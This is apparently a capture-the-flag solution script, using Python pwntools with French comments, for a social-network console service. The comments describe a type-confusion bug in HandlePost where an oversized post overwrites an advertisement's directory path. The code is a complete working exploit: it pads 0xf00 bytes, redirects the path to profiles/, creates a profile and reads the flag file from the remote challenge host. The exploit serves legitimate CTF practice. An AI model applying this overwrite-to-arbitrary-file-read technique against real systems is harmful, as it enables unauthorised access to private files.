#!/usr/bin/env python3
from pwn import *

# Il manque un check dans la fonction HandlePost dans Console.cpp
# On peut poster dans n'importe quel compte.
# 
# Les deux grands types de comptes sont les suivants :
# 
# class AdEnabledAccount : public Account {
# public:
# 	char last_post[0x1000];
# 	string status;
# 	string ad_type;
# 	vector<string> posts;
# 	AdEnabledAccount(ProfileType profile_type, string ad_type);
# 	void AddPost(string post);
# };
# 
# class Advertisement : public Account {
# public:
# 	char ad_text[0xf00];
#   char advertisers_directory[0x100] = "advertisements/";
# 	string ad_type;
# 	Advertisement(string ad_type);
# 	bool ChangeAdType(string ad_type);
# 	bool IsAdTypeValid(string ad_type);
# 	string GetAdType();
# 	string GetAdText();
# };
#
# Quand on poste, le compte récupéré dans la base de données
# est casté sans vérification en un (AdEnabledAccount *)
# Si on écrit dans un compte Advertisement, on peut overwrite 
# le advertisers_directory vu qu'un post peut faire jusqu'à 0x1000 bytes
# 
# Ca nous donne une lecture de fichier arbitraire en gros vu que les annonces
# sont lues depuis un fichier et qu'on trouve le fichier correspondant avec le path
# advertisers_directory + ad_type
# Si on réécrit advertisers_directory et qu'on crée un compte avec un nouveau type
# d'annonce, on peut lire n'importe quel fichier sur le système sous réserve qu'on
# connait son path
# Le flag se trouve dans profiles/friendzone_ceo

r = remote("challenges.ctfd.io", 30481)
r.sendlineafter("cmd>", "POST 2618")
r.sendlineafter("post>", "A" * 0xf00 + "profiles/")
r.sendlineafter("cmd>", "EDIT_PROFILE 2618")
r.sendlineafter("ad_type>", "friendzone_ceo")
r.sendlineafter("cmd>", "CREATE_PROFILE personal")
r.sendlineafter("User Name>", "aze")
r.sendlineafter("Enter your city, state>", "aze")
r.sendlineafter("Enter your Gender>", "aze")
r.sendlineafter("Enter your Age>", "12")
r.sendlineafter("Enter an AdType>", "friendzone_ceo")
r.recvuntil("profile_id:")
profile_id = r.recvuntil(")")[:-1]
r.sendlineafter("cmd>", b"VIEW_PROFILE " + profile_id)
r.recvline()
r.recvline()
r.recvline()
r.recvline()
print(r.recvline())
